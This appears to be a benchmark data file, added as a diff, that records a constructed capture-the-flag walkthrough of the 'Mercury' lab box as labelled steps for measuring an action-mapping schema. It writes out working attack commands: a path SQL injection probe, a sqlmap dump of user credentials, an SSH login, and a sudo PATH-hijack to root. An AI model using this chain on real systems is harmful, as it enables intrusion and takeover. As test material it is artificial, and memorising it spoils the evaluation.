@@ -1,0 +1,121 @@
+{
+  "box": "Mercury",
+  "source": "Representative walkthrough constructed from public Mercury write-up structure (Django path SQLi -> dumped creds -> SSH pivot -> sudo PATH-hijack root). Author-constructed for offline Phase-1 mapping measurement; NOT a live capture.",
+  "abstract_family": "leak_authed_privesc",
+  "vulnhub_correspondence": "A Django app on 8080 has a SQL injection in the /mercuryfacts/<id>/ path; dumping the users table leaks SSH credentials; after the SSH pivot a notes file leaks a second account whose sudo entry is PATH-hijackable to root.",
+  "target_label": "http://10.10.10.5:8080",
+  "steps": [
+    {
+      "step": 0,
+      "phase": "recon",
+      "actor_intent": "Scan the target for open services and versions.",
+      "tool": "nmap",
+      "tool_command": "nmap -sV -p- 10.10.10.5",
+      "tool_output": "PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1\n8080/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.8.5)",
+      "reference_abstract_action": "service_enumeration",
+      "reference_state_after": {"open_services": ["http:8080"], "tech_stack": ["python"]}
+    },
+    {
+      "step": 1,
+      "phase": "enumeration",
+      "actor_intent": "Fingerprint the web framework behind port 8080.",
+      "tool": "whatweb",
+      "tool_command": "whatweb http://10.10.10.5:8080/",
+      "tool_output": "http://10.10.10.5:8080/ [200 OK] HTTPServer[Werkzeug/1.0.1 Python/3.8.5], Python[3.8.5], X-Powered-By[Django]",
+      "reference_abstract_action": "http_fingerprint",
+      "reference_state_after": {"tech_stack": ["python"]}
+    },
+    {
+      "step": 2,
+      "phase": "enumeration",
+      "actor_intent": "Enumerate application routes to find the facts endpoints.",
+      "tool": "gobuster",
+      "tool_command": "gobuster dir -u http://10.10.10.5:8080/ -w common.txt",
+      "tool_output": "/robots.txt           (Status: 200)\n/mercuryfacts         (Status: 301)\n/mercuryfacts/1       (Status: 200)\n/mercuryfacts/list-facts (Status: 200)",
+      "reference_abstract_action": "web_path_enumeration",
+      "reference_state_after": {"discovered_paths": ["/mercuryfacts", "/mercuryfacts/list-facts"]}
+    },
+    {
+      "step": 3,
+      "phase": "vuln-id",
+      "actor_intent": "Probe the numeric fact id in the path for SQL injection.",
+      "tool": "curl",
+      "tool_command": "curl 'http://10.10.10.5:8080/mercuryfacts/2%20or%201=1/'",
+      "tool_output": "OperationalError at /mercuryfacts/2 or 1=1/\nnear \"or\": syntax error\nDjango raised a database exception (sqlite3/mysql) — input reaches the query unsanitised",
+      "reference_abstract_action": "vulnerability_check",
+      "vuln_id": "django_path_sqli",
+      "reference_state_after": {}
+    },
+    {
+      "step": 4,
+      "phase": "exploit",
+      "actor_intent": "Exploit the path SQL injection to dump the users table.",
+      "tool": "sqlmap",
+      "tool_command": "sqlmap -u 'http://10.10.10.5:8080/mercuryfacts/1*/' --dump -T users",
+      "tool_output": "parameter '#1*' is injectable\nthe back-end DBMS is vulnerable\nDatabase: mercury\nTable: users\n| webmaster | johnny1987 |\n| linuxmaster | reallaxsX |",
+      "reference_abstract_action": "exploit_attempt",
+      "vuln_id": "django_path_sqli",
+      "reference_state_after": {"verified_vulnerabilities": ["django_path_sqli"]}
+    },
+    {
+      "step": 5,
+      "phase": "pivot",
+      "actor_intent": "Log in over SSH as webmaster with the dumped password.",
+      "tool": "command",
+      "tool_command": "ssh webmaster@10.10.10.5",
+      "tool_output": "webmaster@10.10.10.5's password:\nWelcome to Ubuntu 20.04\nwebmaster@mercury:~$ id\nuid=1000(webmaster) gid=1000(webmaster)",
+      "reference_abstract_action": "out_of_abstraction",
+      "out_of_abstraction_reason": "Interactive SSH login with the recovered credentials is a non-web service authentication; the schema's auth_attempt/credential_use are web-form/HTTP only and there is no SSH-login action.",
+      "suggested_schema_extension": "ssh_remote_login",
+      "reference_state_after": {}
+    },
+    {
+      "step": 6,
+      "phase": "loot",
+      "actor_intent": "Read the notes file in the home directory that leaks a second account.",
+      "tool": "fileread",
+      "tool_command": "cat /home/webmaster/mercury_proj/notes.txt",
+      "tool_output": "todo: rotate linuxmaster password\nlinuxmaster:bla...redacted... (base64 stored in mail)",
+      "reference_abstract_action": "sensitive_file_read",
+      "file_id": "notes",
+      "reference_state_after": {"read_files": ["notes"]}
+    },
+    {
+      "step": 7,
+      "phase": "privesc-recon",
+      "actor_intent": "Switch to linuxmaster and inspect the sudo permissions.",
+      "tool": "command",
+      "tool_command": "su linuxmaster; sudo -l",
+      "tool_output": "Matching Defaults entries for linuxmaster:\n    env_keep+=LD_PRELOAD, SETENV\nUser linuxmaster may run the following commands:\n    (root) SETENV: NOPASSWD: /usr/bin/check_syslog.sh",
+      "reference_abstract_action": "post_exploitation",
+      "reference_state_after": {}
+    },
+    {
+      "step": 8,
+      "phase": "privesc",
+      "actor_intent": "Escalate to root by hijacking the PATH the sudo-allowed script relies on.",
+      "tool": "privesc",
+      "tool_command": "sudo PATH=/tmp:$PATH /usr/bin/check_syslog.sh   # /tmp/tail -> /bin/bash",
+      "tool_output": "# id\nuid=0(root) gid=0(root) groups=0(root)\nroot",
+      "reference_abstract_action": "privilege_escalation",
+      "rooted": true,
+      "reference_state_after": {"privilege_level": "root"},
+      "candidate_pool": [
+        "Escalate to root by hijacking the PATH the sudo-allowed script relies on.",
+        "Read the root flag before having root.",
+        "Re-run the SQL injection that already dumped the users."
+      ]
+    },
+    {
+      "step": 9,
+      "phase": "loot",
+      "actor_intent": "Read the root flag.",
+      "tool": "fileread",
+      "tool_command": "cat /root/flag.txt",
+      "tool_output": "flag{ad7b1f3c... mercury rooted}",
+      "reference_abstract_action": "sensitive_file_read",
+      "file_id": "root_flag",
+      "reference_state_after": {"read_files": ["root_flag"]}
+    }
+  ]
+}
